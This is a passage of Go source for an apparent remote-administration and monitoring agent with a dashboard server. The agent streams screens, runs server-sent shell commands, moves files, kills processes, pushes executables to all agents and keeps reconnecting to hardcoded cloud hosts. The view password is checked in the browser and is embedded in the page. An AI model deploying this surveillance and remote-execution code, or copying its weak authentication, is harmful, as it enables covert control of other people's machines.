			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "agentsNotified": 0})
			return
		}
		if r.URL.Path == "/api/export-logs" {
			logDir := dataDir()
			entries, _ := os.ReadDir(logDir)
			var logs []string
			for _, e := range entries {
				if strings.HasPrefix(e.Name(), "activity-") && strings.HasSuffix(e.Name(), ".log") {
					data, _ := os.ReadFile(filepath.Join(logDir, e.Name()))
					logs = append(logs, string(data))
				}
			}
			w.Header().Set("Content-Type", "text/csv")
			w.Header().Set("Content-Disposition", "attachment; filename=agent-logs.csv")
			w.Write([]byte("timestamp,agent,state,idle,active\n"))
			for _, l := range logs { w.Write([]byte(l)) }
			return
		}
		if r.URL.Path == "/api/compile-monthly-report" {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "agentCount": len(agents)})
			return
		}
		if r.URL.Path == "/api/push-logs-to-github" && r.Method == "POST" {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
			return
		}
		if r.URL.Path == "/api/support-token" && r.Method == "POST" {
			agentId := r.Header.Get("x-agent-id")
			expires := r.Header.Get("x-expires")
			token := sha256Hex(agentId + time.Now().String())[:16]
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "token": token, "url": "/view/" + agentId + "?token=" + token, "expiresMinutes": expires})
			return
		}
		if r.URL.Path == "/api/upload-update" && r.Method == "POST" {
			filename := r.Header.Get("x-filename")
			if filename == "" { filename = "SystemHelper.exe" }
			body, _ := io.ReadAll(r.Body)
			decoded, _ := base64.StdEncoding.DecodeString(string(body))
			exe, _ := os.Executable()
			dir := filepath.Dir(exe)
			os.WriteFile(filepath.Join(dir, filename), decoded, 0755)
			log("Update uploaded: " + filename + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ")")
			// Push to all agents
			activeConnsMu.RLock()
			pushed := 0
			for _, sc := range activeConnections {
				if sc == nil || sc.dead { continue }
				sc.mu.Lock()
				if sc.conn != nil {
					if sc.conn.WriteJSON(Message{Type: "push-update", Command: filename, Frame: base64.StdEncoding.EncodeToString(decoded)}) == nil {
						pushed++
					}
				}
				sc.mu.Unlock()
			}
			activeConnsMu.RUnlock()
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "pushedTo": pushed})
			return
		}

		// Main dashboard page
		if r.URL.Path == "/" {
			var html string
			// Try to load dashboard.html from file system first
			data, err := os.ReadFile(dashboardPath)
			if err == nil {
				html = string(data)
			} else {
				// Fallback to embedded dashboard
				html = htmlDashboard
			}
			// Replace placeholders
			html = strings.Replace(html, "TOKEN_PLACEHOLDER", authToken, 1)
			html = strings.Replace(html, "PASS_PLACEHOLDER", authPass, 1)
			html = strings.Replace(html, "USER_PLACEHOLDER", authUser, 1)
			html = strings.Replace(html, "BRANDING_TITLE", BrandingTitle, 1)
			html = strings.Replace(html, "BRANDING_CREDIT", BrandingCredit, 1)
			// Replace hardcoded auth in dashboard.js
			html = strings.ReplaceAll(html, "const AUTH_PASS = 'puneet12';", "const AUTH_PASS = '"+authPass+"';")
			html = strings.ReplaceAll(html, "btoa('puneet:' + AUTH_PASS)", "btoa('"+authUser+":' + AUTH_PASS)")
			w.Write([]byte(html))
		}
	})

	log("Listening on :3000")
	http.ListenAndServe(":3000", nil)
}

func serveViewPage(w http.ResponseWriter, r *http.Request, agentId, authToken string) {
	html := `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Remote View</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:system-ui;overflow:hidden;height:100vh;display:flex;flex-direction:column}
#topbar{background:#1b5e20;padding:8px 16px;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}
#topbar h1{font-size:14px;color:#fff}
#topbar button{background:#2e7d32;color:#fff;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:12px;margin-left:8px}
#screen{flex:1;display:flex;align-items:center;justify-content:center;background:#000;position:relative;overflow:hidden}
#screen img{max-width:100%;max-height:100%;object-fit:contain}
#controls{position:absolute;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.7);padding:8px 16px;border-radius:8px;display:none;gap:8px}
#controls.show{display:flex}
#controls button{background:#4caf50;color:#fff;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:12px}
#lock-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:100}
#lock-box{background:#fff;padding:24px;border-radius:8px;text-align:center;max-width:300px;width:90%}
#lock-box input{width:100%;padding:8px;margin:8px 0;border:1px solid #ddd;border-radius:4px}
#lock-box button{width:100%;padding:8px;background:#4caf50;color:#fff;border:none;border-radius:4px;cursor:pointer}
</style></head><body>
<div id="lock-overlay"><div id="lock-box">
<h3>🔒 Remote View</h3><p style="font-size:12px;color:#666;margin:8px 0">Enter password to control this screen</p>
<input type="password" id="view-pass" placeholder="Password" autofocus>
<button onclick="unlockView()">Unlock Control</button>
<div id="view-error" style="color:#d32f2f;font-size:11px;margin-top:6px;display:none"></div>
</div></div>
<div id="topbar"><h1 id="agent-name">Loading...</h1><div>
<button onclick="toggleControls()">🖱 Controls</button>
<button onclick="requestScreenshot()">📸 Screenshot</button>
<button onclick="location.reload()">🔄 Refresh</button>
</div></div>
<div id="screen"><img id="frame" src="" alt="No frame yet"><div id="controls">
<button onmousedown="sendControl('click',{x:50,y:50,button:0})">Left Click</button>
<button onmousedown="sendControl('click',{x:50,y:50,button:2})">Right Click</button>
<button onclick="sendControl('keypress',{key:'Enter'})">Enter</button>
<button onclick="sendControl('keypress',{key:'Escape'})">Esc</button>
</div></div>
<script>
var agentId='` + agentId + `',ws,authenticated=false
function unlockView(){if(document.getElementById('view-pass').value==='PASS_PLACEHOLDER'){authenticated=true;document.getElementById('lock-overlay').style.display='none'}else{document.getElementById('view-error').textContent='Wrong password';document.getElementById('view-error').style.display='block'}}
function toggleControls(){document.getElementById('controls').classList.toggle('show')}
function requestScreenshot(){ws.send(JSON.stringify({type:'request-screenshot',agentId:agentId}))}
function sendControl(cmd,params){ws.send(JSON.stringify({type:'control',agentId:agentId,command:cmd,params:params}))}
var screen=document.getElementById('screen')
screen.addEventListener('mousemove',function(e){if(!authenticated)return;var r=screen.getBoundingClientRect();sendControl('mousemove',{x:String(((e.clientX-r.left)/r.width)*100),y:String(((e.clientY-r.top)/r.height)*100)})})
screen.addEventListener('click',function(e){if(!authenticated)return;var r=screen.getBoundingClientRect();sendControl('click',{x:String(((e.clientX-r.left)/r.width)*100),y:String(((e.clientY-r.top)/r.height)*100),button:'0'})})
screen.addEventListener('contextmenu',function(e){if(!authenticated)return;e.preventDefault();var r=screen.getBoundingClientRect();sendControl('click',{x:String(((e.clientX-r.left)/r.width)*100),y:String(((e.clientY-r.top)/r.height)*100),button:'2'})})
document.addEventListener('keydown',function(e){if(!authenticated)return;sendControl('keypress',{key:e.key})})
function connect(){ws=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token=` + authToken + `')
ws.onopen=function(){ws.send(JSON.stringify({type:'view-agent',agentId:agentId}))}
ws.onmessage=function(e){var d=JSON.parse(e.data);if(d.type==='frame'){document.getElementById('frame').src='data:image/jpeg;base64,'+d.frame}if(d.type==='agent-connected'){document.getElementById('agent-name').textContent=d.name||d.agentId}}
ws.onclose=function(){setTimeout(connect,3000)}}
connect()
</script></body></html>`
	w.Write([]byte(html))
}

func serveRemoteAssistant(w http.ResponseWriter, r *http.Request, authToken string) {
	html := `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Remote Assistant</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;color:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center}
.box{background:#fff;border-radius:12px;padding:32px;max-width:480px;width:90%;box-shadow:0 2px 12px rgba(0,0,0,0.08);text-align:center}
h2{font-size:20px;color:#1976d2;margin-bottom:8px}
.desc{font-size:14px;color:#666;margin-bottom:24px;line-height:1.5}
.step{background:#f8f9fa;border-radius:8px;padding:16px;margin-bottom:12px;text-align:left}
.step h3{font-size:14px;color:#333;margin-bottom:8px}
.step p{font-size:13px;color:#666;margin-bottom:12px}
#code{font-size:32px;letter-spacing:8px;font-weight:700;color:#1976d2;padding:16px;background:#f0f7ff;border-radius:8px;display:none;margin:12px 0}
#status{margin-top:12px;font-size:13px;padding:10px;border-radius:8px;display:none}
#status.ok{display:block;color:#2e7d32;background:#e8f5e9}
#status.err{display:block;color:#c62828;background:#ffebee}
#status.wait{display:block;color:#1565c0;background:#e3f2fd}
button{width:100%;padding:14px;background:#1976d2;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
button:hover{background:#1565c0}
button.green{background:#2e7d32}
button.green:hover{background:#1b5e20}
</style></head><body>
<div class="box">
<h2>🤝 Remote Assistant</h2>
<p class="desc">Get help from a support technician — no software installation needed</p>
<div class="step">
<h3>Step 1: Share Your Screen</h3>
<p>Click below and select the screen you want to share with support</p>
<button class="green" onclick="startShare()">📺 Start Screen Share</button>
</div>
<div id="code"></div>
<div class="step" id="connect-step" style="display:none">
<h3>Step 2: Share This Code With Support</h3>
<p>Give this 6-digit code to your support technician so they can view your screen</p>
</div>
<div id="status"></div>
</div>
<script>
var ws,sessionId=null,captureInterval=null
function startShare(){
navigator.mediaDevices.getDisplayMedia({video:{cursor:'always'},audio:false}).then(function(stream){
var video=document.createElement('video')
video.srcObject=stream
video.muted=true
video.play()
var canvas=document.createElement('canvas')
var ctx=canvas.getContext('2d')
var st=document.getElementById('status')
st.className='wait';st.textContent='⏳ Creating session...'
sessionId=Math.random().toString(36).substr(2,6).toUpperCase()
document.getElementById('code').textContent=sessionId
document.getElementById('code').style.display='block'
document.getElementById('connect-step').style.display='block'
ws=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token=` + authToken + `')
ws.onopen=function(){
ws.send(JSON.stringify({type:'remote-assistant-create',command:sessionId}))
st.className='ok';st.textContent='✅ Ready! Share code '+sessionId+' with your support technician'
}
ws.onmessage=function(e){
var d=JSON.parse(e.data)
if(d.type==='remote-assistant-joined'){
st.className='ok';st.textContent='✅ Support technician is viewing your screen'
}
if(d.type==='control'){
// Handle remote control (future enhancement)
}
}
// Capture frames every 500ms and send to server
video.onloadedmetadata=function(){
canvas.width=video.videoWidth
canvas.height=video.height
captureInterval=setInterval(function(){
ctx.drawImage(video,0,0)
var frame=canvas.toDataURL('image/jpeg',0.6).split(',')[1]
if(ws&&ws.readyState===1){
ws.send(JSON.stringify({type:'remote-assistant-frame',frame:frame}))
}
},500)
}
stream.getVideoTracks()[0].onended=function(){
if(captureInterval)clearInterval(captureInterval)
st.className='err';st.textContent='❌ Screen sharing stopped'
document.getElementById('code').style.display='none'
document.getElementById('connect-step').style.display='none'
}
}).catch(function(err){
alert('Screen sharing is required: '+err.message)
})
}
</script></body></html>`
	w.Write([]byte(html))
}

func serveMultiControl(w http.ResponseWriter, r *http.Request, authToken string) {
	agentIds := r.URL.Query()["agent"]
	html := `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Multi-Control</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:system-ui;overflow:hidden}
#grid{display:grid;gap:2px;padding:2px;height:100vh}
.cell{background:#111;position:relative;overflow:hidden;cursor:crosshair}
.cell img{width:100%;height:100%;object-fit:contain}
.cell .label{position:absolute;top:4px;left:4px;background:rgba(0,0,0,0.7);color:#fff;padding:2px 6px;border-radius:3px;font-size:11px}
</style></head><body>
<div id="grid"></div>
<script>
var agents=` + func() string { b, _ := json.Marshal(agentIds); return string(b) }() + `
var ws=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token=` + authToken + `')
var frames={}
ws.onopen=function(){agents.forEach(function(id){ws.send(JSON.stringify({type:'view-agent',agentId:id}))})}
ws.onmessage=function(e){var d=JSON.parse(e.data);if(d.type==='frame'){frames[d.agentId]=d.frame;var img=document.getElementById('f-'+d.agentId);if(img)img.src='data:image/jpeg;base64,'+d.frame}}
function renderGrid(){var g=document.getElementById('grid');g.style.gridTemplateColumns='repeat('+Math.ceil(Math.sqrt(agents.length))+',1fr)'
agents.forEach(function(id){if(!document.getElementById('c-'+id)){var c=document.createElement('div');c.className='cell';c.id='c-'+id;c.innerHTML='<img id="f-'+id+'" src=""><span class="label">'+id+'</span>'
c.addEventListener('click',function(e){var r=c.getBoundingClientRect();ws.send(JSON.stringify({type:'control',agentId:id,command:'click',params:{x:String(((e.clientX-r.left)/r.width)*100),y:String(((e.clientY-r.top)/r.height)*100),button:'0'}}))})
g.appendChild(c)}})}
renderGrid()
</script></body></html>`
	w.Write([]byte(html))
}

// Discover server on local network by scanning subnet for port 3000
func discoverServer() string {
	// Get local IP to determine subnet
	localIP := getLocalIP()
	if localIP == "" { return "" }
	
	parts := strings.Split(localIP, ".")
	if len(parts) != 4 { return "" }
	subnet := parts[0] + "." + parts[1] + "." + parts[2] + "."
	myLast, _ := strconv.Atoi(parts[3])

	// Scan hosts 1-254 in parallel
	result := make(chan string, 254)
	for i := 1; i <= 254; i++ {
		if i == myLast { continue } // skip self
		go func(host int) {
			ip := subnet + strconv.Itoa(host)
			conn, err := net.DialTimeout("tcp", ip+":3000", 500*time.Millisecond)
			if err == nil {
				conn.Close()
				result <- ip
			} else {
				result <- ""
			}
		}(i)
	}

	// Wait for results
	timeout := time.After(3 * time.Second)
	found := ""
	for i := 1; i <= 253; i++ {
		select {
		case ip := <-result:
			if ip != "" {
				found = ip
				// Don't return immediately - wait for all to finish
			}
		case <-timeout:
			return found
		}
	}
	return found
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil { return "" }
	
	var lanIP, linkLocalIP string
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ip := ipnet.IP.To4(); ip != nil {
				ipStr := ip.String()
				// Prefer LAN IPs: 192.168.x.x, 10.x.x.x, 172.16-31.x.x
				if strings.HasPrefix(ipStr, "192.168.") || 
				   strings.HasPrefix(ipStr, "10.") || 
				   (len(ip) >= 2 && ip[0] == 172 && ip[1] >= 16 && ip[1] <= 31) {
					return ipStr
				}
				// Keep link-local as fallback
				if strings.HasPrefix(ipStr, "169.254.") {
					linkLocalIP = ipStr
				} else if lanIP == "" {
					lanIP = ipStr
				}
			}
		}
	}
	
	// Return best available IP
	if lanIP != "" { return lanIP }
	if linkLocalIP != "" { return linkLocalIP }
	return ""
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err == nil && resp != nil {
		defer resp.Body.Close()
		buf := new(bytes.Buffer)
		buf.ReadFrom(resp.Body)
		ip := strings.TrimSpace(buf.String())
		if len(ip) > 6 && len(ip) < 46 { return ip }
	}
	return ""
}
func isValidURL(u string) bool {
	return strings.HasPrefix(u, "ws://") || strings.HasPrefix(u, "wss://")
}

func stripANSI(s string) string {
	// Remove ANSI escape sequences like \x1b[2m, \x1b[0m, etc.
	result := ""
	inEscape := false
	for _, r := range s {
		if r == 27 { // ESC character
			inEscape = true
		} else if inEscape {
			if r == 'm' || r == 'H' || r == 'J' || r == 'K' || r == 'A' || r == 'B' || r == 'C' || r == 'D' {
				inEscape = false
			}
		} else {
			result += string(r)
		}
	}
	return result
}

func strVal(v interface{}) string {
	if v == nil { return "" }
	if s, ok := v.(string); ok { return s }
	return fmt.Sprintf("%v", v)
}

func intVal(v interface{}) int {
	if v == nil { return 0 }
	switch val := v.(type) {
	case float64: return int(val)
	case int: return val
	case int64: return int(val)
	}
	return 0
}

func int64Val(v interface{}) int64 {
	if v == nil { return 0 }
	switch val := v.(type) {
	case float64: return int64(val)
	case int: return int64(val)
	case int64: return val
	}
	return 0
}

// ============ BULLETPROOF INDEPENDENT CONNECTION MANAGER ============
// Each server URL gets its own goroutine that:
//   1. Connects independently
//   2. Sends hello independently
//   3. Reads messages independently
//   4. Reconnects on failure independently
//   5. NEVER affects other connections
// The agent process NEVER dies — only individual connection goroutines restart.

// frameCaptureLoop captures frames and sends to ALL active connections independently
func frameCaptureLoop() {
	ticker := time.NewTicker(200 * time.Millisecond) // 5 FPS base
	defer ticker.Stop()
	
	for range ticker.C {
		frames := captureFrames()
		if len(frames) == 0 { continue }
		
		activeConnsMu.RLock()
		conns := make([]*serverConnection, len(activeConnections))
		copy(conns, activeConnections)
		activeConnsMu.RUnlock()
		
		now := time.Now()
		for _, sc := range conns {
			if sc == nil { continue }
			sc.mu.Lock()
			if sc.dead || sc.conn == nil {
				sc.mu.Unlock()
				continue
			}
			isLocal := strings.Contains(sc.name, "local")
			interval := time.Second / 10
			if !isLocal { interval = time.Second / 3 }
			if now.Sub(sc.lastSend) < interval {
				sc.mu.Unlock()
				continue
			}
			
			for _, m := range frames {
				m.Type = "agent-frame"
				m.AgentId = agentId
				if err := sc.conn.WriteJSON(m); err != nil {
					sc.dead = true
					log("[" + sc.name + "] frame send failed: " + err.Error())
					break
				}
			}
			if !sc.dead {
				sc.lastSend = now
			}
			sc.mu.Unlock()
		}
	}
}

// manageServerConnection runs forever for a single server URL
// It connects, sends hello, reads messages, and reconnects on failure — independently
func manageServerConnection(url string, name string) {
	retryDelay := 2 * time.Second
	maxRetry := 30 * time.Second
	
	for {
		// Build auth URL
		authURL := url
		if !strings.HasSuffix(authURL, "/ws") {
			authURL = authURL + "/ws"
		}
		authURL = authURL + "?token=" + authToken
		
		// Dial with appropriate timeout
		dialer := *websocket.DefaultDialer
		if strings.Contains(url, "render.com") {
			dialer.HandshakeTimeout = 55 * time.Second
		} else {
			dialer.HandshakeTimeout = 10 * time.Second
		}
		
		log("[" + name + "] Connecting to " + url)
		c, _, err := dialer.Dial(authURL, nil)
		if err != nil {
			log("[" + name + "] Connection failed: " + err.Error())
			time.Sleep(retryDelay)
			retryDelay = retryDelay * 2
			if retryDelay > maxRetry { retryDelay = maxRetry }
			continue
		}
		
		retryDelay = 2 * time.Second // reset on success
		log("[" + name + "] Connected")
		
		// Register connection
		sc := &serverConnection{
			url:      url,
			name:     name,
			conn:     c,
			dead:     false,
			lastSend: time.Now(),
		}
		
		activeConnsMu.Lock()
		// Remove old connection with same name if exists
		for i, existing := range activeConnections {
			if existing != nil && existing.name == name {
				activeConnections[i] = nil
			}
		}
		activeConnections = append(activeConnections, sc)
		activeConnsMu.Unlock()
		
		// Send hello
		localIP := getLocalIP()
		publicIP := getPublicIP()
		displayName := hostname
		if localIP != "" { displayName = hostname + " (" + localIP + ")" }
		
		connectionId = fmt.Sprintf("%d", time.Now().UnixNano())
		
		sc.mu.Lock()
		err = c.WriteJSON(Message{
			Type: "agent-hello", AgentId: agentId, Name: displayName, Org: orgName,
			Data: map[string]interface{}{
				"bootTime":     bootTime().Format(time.RFC3339),
				"programStart": programStartTime.Format(time.RFC3339),
				"version":      Version,
				"agentIP":      localIP,
				"localIP":      localIP,
				"publicIP":     publicIP,
				"hostname":     hostname,
				"connectionId": connectionId,
				"connName":     name,
			},
		})
		sc.mu.Unlock()
		
		if err != nil {
			log("[" + name + "] Hello failed: " + err.Error())
			c.Close()
			continue
		}
		
		log("[" + name + "] Hello sent — " + displayName)
		
		// Ping keepalive
		go func(conn *websocket.Conn, connName string) {
			ticker := time.NewTicker(30 * time.Second)
			defer ticker.Stop()
			for range ticker.C {
				conn.WriteMessage(websocket.PingMessage, nil)
			}
		}(c, name)
		
		// Message reader — this is the ONLY thing that can end this goroutine
		for {
			_, m, e := c.ReadMessage()
			if e != nil {
				log("[" + name + "] Disconnected: " + e.Error())
				break
			}
			
			var d Message
			if err := json.Unmarshal(m, &d); err != nil {
				continue
			}
			
			// Handle all message types
			handleAgentMessage(d, c, name)
		}
		
		// Connection lost — unregister and reconnect
		sc.mu.Lock()
		sc.dead = true
		sc.conn = nil
		sc.mu.Unlock()
		
		activeConnsMu.Lock()
		for i, existing := range activeConnections {
			if existing == sc {
				activeConnections[i] = nil
			}
		}
		activeConnsMu.Unlock()
		
		c.Close()
	}
}

// handleAgentMessage processes all incoming messages from servers
func handleAgentMessage(d Message, c *websocket.Conn, name string) {
	switch d.Type {
	case "set-fps":
		if d.Fps > 0 {
			fps = d.Fps
			if fps <= 2 {
				jpegQuality = 50
				isRemoteConnection = false
			} else if fps <= 5 {
				jpegQuality = 40
				isRemoteConnection = true
			} else {
				jpegQuality = 30
				isRemoteConnection = true
			}
		}
	case "control":
		now := time.Now()
		if now.Sub(controlCmdWindowStart) > time.Second {
			controlCmdWindowStart = now
			controlCmdCount = 0
		}
		controlCmdCount++
		if controlCmdCount <= maxControlCmdsPerSec {
			executeControl(d.Command, d.Params)
		}
	case "set-server-preference":
		saveServerPreference(d.Command == "true")
		log("[" + name + "] set server preference = " + d.Command)
	case "push-update":
		handleRemoteUpdate(d.Command, d.Frame)
	case "switch-server":
		if d.Command != "" {
			log("[" + name + "] Remote switch to: " + d.Command)
			os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(d.Command+"\n"), 0644)
			saveServerPreference(true)
			// Close all connections to force immediate reconnect to new server
			activeConnsMu.RLock()
			for _, sc := range activeConnections {
				if sc != nil && !sc.dead {
					sc.mu.Lock()
					if sc.conn != nil { sc.conn.Close() }
					sc.mu.Unlock()
				}
			}
			activeConnsMu.RUnlock()
		}
	case "update-server-list":
		rawUrls, ok := d.Data["urls"]
		if !ok { return }
		urlSlice, ok := rawUrls.([]interface{})
		if !ok { return }
		var newUrls []string
		for _, u := range urlSlice {
			if s, ok := u.(string); ok {
				newUrls = append(newUrls, s)
			}
		}
		if len(newUrls) > 0 {
			content := strings.Join(newUrls, "\n") + "\n"
			os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(content), 0644)
			log("Server list updated: " + strings.Join(newUrls, ", "))
		}
	case "file-transfer":
		handleFileTransfer(d.Command, d.Frame)
	case "request-file":
		go handleFileRequest(d.Command, c)
	case "start-tunnel":
		go startTunnel(c)
	case "become-server":
		log("[" + name + "] exposing as server via tunnel")
		saveServerPreference(true)
		go startTunnel(c)
	case "webrtc-offer":
		sdpRaw, sdpOk := d.Data["sdp"]
		viewerRaw, viewOk := d.Data["viewer"]
		if sdpOk && viewOk {
			sdpStr, sdpStrOk := sdpRaw.(string)
			viewerId, viewStrOk := viewerRaw.(string)
			if sdpStrOk && viewStrOk {
				var offer webrtc.SessionDescription
				offer.SDP = sdpStr
				offer.Type = webrtc.SDPTypeOffer
				go handleWebRTCOffer(c, viewerId, offer)
			}
		}
	case "webrtc-ice-candidate":
		if candRaw, ok := d.Data["candidate"]; ok {
			candStr, strOk := candRaw.(string)
			viewerRaw, viewOk := d.Data["viewer"]
			if strOk && viewOk {
				viewerId, viewStrOk := viewerRaw.(string)
				if viewStrOk {
					var cand webrtc.ICECandidateInit
					if err := json.Unmarshal([]byte(candStr), &cand); err != nil {
						log("WebRTC ICE candidate parse error: " + err.Error())
					} else {
						handleWebRTCICECandidate(viewerId, cand)
					}
				}
			}
		}
	case "request-system-info":
		go func() {
			info := getSystemInfo()
			c.WriteJSON(Message{Type: "system-info", AgentId: agentId, Data: info})
		}()
	case "request-processes":
		go func() {
			procs := getProcessList()
			c.WriteJSON(Message{Type: "process-list", AgentId: agentId, Data: map[string]interface{}{"processes": procs}})
		}()
	case "kill-process":
		pid := d.Command
		go func() {
			ok := killProcess(pid)
			c.WriteJSON(Message{Type: "process-killed", AgentId: agentId, Data: map[string]interface{}{"pid": pid, "success": ok}})
		}()
	case "request-services":
		go func() {
			svcs := getServiceList()
			c.WriteJSON(Message{Type: "service-list", AgentId: agentId, Data: map[string]interface{}{"services": svcs}})
		}()
	case "control-service":
		svcName := d.Command
		action := strVal(d.Data["action"])
		go func() {
			ok := controlService(svcName, action)
			c.WriteJSON(Message{Type: "service-controlled", AgentId: agentId, Data: map[string]interface{}{"name": svcName, "action": action, "success": ok}})
		}()
	case "request-drives":
		go func() {
			drives := getDriveList()
			c.WriteJSON(Message{Type: "drive-list", AgentId: agentId, Data: map[string]interface{}{"drives": drives}})
		}()
	case "list-files":
		dirPath := d.Command
		go func() {
			files := listFiles(dirPath)
			c.WriteJSON(Message{Type: "file-list", AgentId: agentId, Data: map[string]interface{}{"path": dirPath, "files": files}})
		}()
	case "request-network":
		go func() {
			netInfo := getNetworkInfo()
			c.WriteJSON(Message{Type: "network-info", AgentId: agentId, Data: netInfo})
		}()
	case "request-event-logs":
		count := intVal(d.Data["count"])
		if count <= 0 { count = 50 }
		go func() {
			logs := getEventLogs(count)
			c.WriteJSON(Message{Type: "event-logs", AgentId: agentId, Data: map[string]interface{}{"logs": logs}})
		}()
	case "execute-command":
		cmd := d.Command
		go func() {
			output := executeShellCommand(cmd)
			c.WriteJSON(Message{Type: "command-output", AgentId: agentId, Data: map[string]interface{}{"command": cmd, "output": output}})
		}()
	case "request-screenshot":
		go func() {
			img := captureDisplay(0)
			c.WriteJSON(Message{Type: "screenshot", AgentId: agentId, Frame: img})
		}()
	case "lock-screen":
		go func() {
			lockWorkstation()
			c.WriteJSON(Message{Type: "screen-locked", AgentId: agentId})
		}()
	case "logoff-user":
		go func() { logoffUser() }()
	case "shutdown":
		go func() { shutdownPC() }()
	case "restart":
		go func() { restartPC() }()
	case "sleep":
		go func() { sleepPC() }()
	}
}

func connect() {
	if !isLanMode {
		// Start tunnel in background — NEVER blocks other connections
		if !tunnelStarted {
			log("🚀 Starting tunnel for remote access...")
			tunnelStarted = true
			go startTunnel(nil)
		}

		// Wake up Render server (free tier sleeps after 15 min)
		go func() {
			resp, err := http.Get("https://pu-k752.onrender.com")
			if err == nil {
				defer resp.Body.Close()
				log("✅ Render server responded (HTTP " + strconv.Itoa(resp.StatusCode) + ")")
			}
		}()
	} else {
		log("🔒 LAN mode: tunnel + cloud wake-up skipped")
	}
	
	// Build the list of servers to connect to
	serverUrlsMu.Lock()
	
	// Ensure localhost is always in the list
	foundLocal := false
	for _, u := range serverUrls {
		if u == "ws://127.0.0.1:3000" || u == "ws://127.0.0.1:3000/ws" { foundLocal = true; break }
	}
	if !foundLocal {
		serverUrls = append([]string{"ws://127.0.0.1:3000"}, serverUrls...)
	}
	
	// Ensure embedded URLs are always in the list
	for _, eu := range embeddedServerUrls {
		found := false
		for _, u := range serverUrls {
			if u == eu { found = true; break }
		}
		if !found {
			serverUrls = append(serverUrls, eu)
		}
	}
	
	urlsCopy := make([]string, len(serverUrls))
	copy(urlsCopy, serverUrls)
	serverUrlsMu.Unlock()
	
	log("URLs to manage: " + fmt.Sprintf("%v", urlsCopy))
	
	// Start independent connection manager for each URL
	// Each one runs forever, reconnecting independently
	for _, url := range urlsCopy {
		if !isValidURL(url) { continue }
		
		name := url
		if strings.Contains(url, "127.0.0.1") { name = "local" }
		if strings.Contains(url, "render.com") { name = "render" }
		if strings.Contains(url, "bore") || strings.Contains(url, "localhost.run") { name = "tunnel" }
		
		// Check if we already have a manager for this URL
		activeConnsMu.RLock()
		exists := false
		for _, sc := range activeConnections {
			if sc != nil && sc.url == url {
				exists = true
				break
			}
		}
		activeConnsMu.RUnlock()
		
		if !exists {
			log("[" + name + "] Starting independent connection manager")
			go manageServerConnection(url, name)
		}
	}
	
	// Start frame capture loop (runs once, sends to all active connections)
	go frameCaptureLoop()
	
	// Start IP update ticker
	go func() {
		ipTicker := time.NewTicker(5 * time.Minute)
		defer ipTicker.Stop()
		for range ipTicker.C {
			newLocalIP := getLocalIP()
			newPublicIP := getPublicIP()
			
			activeConnsMu.RLock()
			conns := make([]*serverConnection, len(activeConnections))
			copy(conns, activeConnections)
			activeConnsMu.RUnlock()
			
			for _, sc := range conns {
				if sc == nil { continue }
				sc.mu.Lock()
				if sc.conn != nil && !sc.dead {
					sc.conn.WriteJSON(Message{
						Type: "ip-update", AgentId: agentId,
						Data: map[string]interface{}{"localIP": newLocalIP, "publicIP": newPublicIP},
					})
				}
				sc.mu.Unlock()
			}
			if newLocalIP != "" || newPublicIP != "" {
				log("IP update sent: local=" + newLocalIP + " public=" + newPublicIP)
			}
		}
	}()
	
	// Start status ticker
	go func() {
		statusTicker := time.NewTicker(30 * time.Second)
		defer statusTicker.Stop()
		for range statusTicker.C {
			uptime := int(time.Since(programStartTime).Seconds())
			
			activeConnsMu.RLock()
			connectedCount := 0
			for _, sc := range activeConnections {
				if sc != nil && !sc.dead { connectedCount++ }
			}
			activeConnsMu.RUnlock()
			
			activeConnsMu.RLock()
			conns := make([]*serverConnection, len(activeConnections))
			copy(conns, activeConnections)
			activeConnsMu.RUnlock()
			
			for _, sc := range conns {
				if sc == nil { continue }
				sc.mu.Lock()
				if sc.conn != nil && !sc.dead {
					sc.conn.WriteJSON(Message{
						Type: "agent-status", AgentId: agentId,
						Data: map[string]interface{}{
							"uptime":      uptime,
							"totalIdle":   totalIdleSeconds,
							"totalActive": totalActiveSeconds,
							"currentState": lastIdleState,
							"version":     Version,
							"connections": connectedCount,
						},
					})
				}
				sc.mu.Unlock()
			}
		}
	}()
	
	// This function now NEVER returns — the agent runs forever
	// Individual connections reconnect independently
	select {} // block forever
}

// ============ CONTROL & CAPTURE ============

func safeParseFloat(s string) float64 {
	if s == "" { return 0 }
	var f float64
	n, err := fmt.Sscanf(s, "%f", &f)
	if n != 1 || err != nil { return 0 }
	if f < 0 { f = 0 }
	if f > 100 { f = 100 }
	return f
}

func executeControl(cmd string, params map[string]string) {
	if params == nil { return }
	switch cmd {
